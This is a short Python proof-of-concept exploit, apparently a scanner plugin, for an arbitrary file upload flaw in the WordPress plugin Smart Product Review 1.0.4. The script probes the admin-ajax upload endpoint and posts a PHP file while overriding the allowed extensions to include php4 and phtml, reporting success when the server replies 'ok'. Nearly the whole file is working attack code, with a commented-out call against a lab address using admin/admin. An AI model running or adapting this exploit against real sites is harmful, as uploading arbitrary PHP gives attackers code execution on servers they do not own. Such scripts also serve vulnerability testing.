# coding: utf-8
import requests
import random

def vuln_check(uri):
    response = requests.get(uri)
    raw = response.text

    if ("No script kiddies please!!" in raw):
        return False
    else:
        return True


#Wordpress Plugin Smart Product Review 1.0.4 - Arbitrary File Upload
def poc(url,logindict,user_agent,proxy):

    url = url.strip("/")
    # Authentication:
    # session = requests.Session()
    # auth_url=url+'/wp-login.php'
    # redirecto = url + "/wp-admin/"
    # username=logindict.keys()
    # password=logindict.values()
    header = {'User-Agent': user_agent}
    # data = {'log': username, 'pwd': password, 'wp-submit': 'Log In', 'redirect_to': redirecto, 'testcookie': '1'}
    # if proxy:
    #     proxies = {
    #         "http": "http://%(proxy)s/" % {'proxy': proxy},
    #         "https": "http://%(proxy)s/" % {'proxy': proxy}
    #     }
    #     auth  = session.post(auth_url, headers=header, data=data, proxies=proxies, timeout=5)
    # else:
    #     auth  = session.post(auth_url, headers=header, data=data, timeout=5)

    #漏洞位置
    exploit_url=url+'/wp-admin/admin-ajax.php?action=sprw_file_upload_action'
    # # Get Security nonce value:
    # check = session.get(url+ '/wp-admin/themes.php?page=catch-themes-demo-import').text
    # nonce = check[check.find('ajax_nonce"') + 13:]
    # wp_nonce = nonce[:nonce.find('"')]

    check = vuln_check(exploit_url)
    if check == True:
        file_path='data/phpinfo.php'
        files = {'files[]': open(file_path)}
        data = {
            "allowedExtensions[0]": "jpg",
            "allowedExtensions[1]": "php4",
            "allowedExtensions[2]": "phtml",
            "allowedExtensions[3]": "png",
            "qqfile": "files",
            "element_id": "6837",
            "sizeLimit": "12000000",
            "file_uploader_nonce": "2b102311b7"
        }

        if proxy:
            proxies = {
                "http": "http://%(proxy)s/" % {'proxy': proxy},
                "https": "http://%(proxy)s/" % {'proxy': proxy}
            }
            response = requests.post(exploit_url,headers=header, files=files, data=data,proxies=proxies)
        else:
            response = requests.post(exploit_url,headers=header, files=files, data=data)
        # with open('../../data/b.html','wb') as f:
        #     f.write(response.content)

        if "ok" in response.text:
            return 'Wordpress Plugin Smart Product Review 1.0.4 - 文件上传'



def run(url,logindict,user_agent,proxies):
    # if logindict:
    result = poc(url,logindict,user_agent,proxies)
    return result

# run("http://192.168.220.128/Wordpress/wordpress-5.8.2-zh_CN/",{'admin':'admin'},'','')
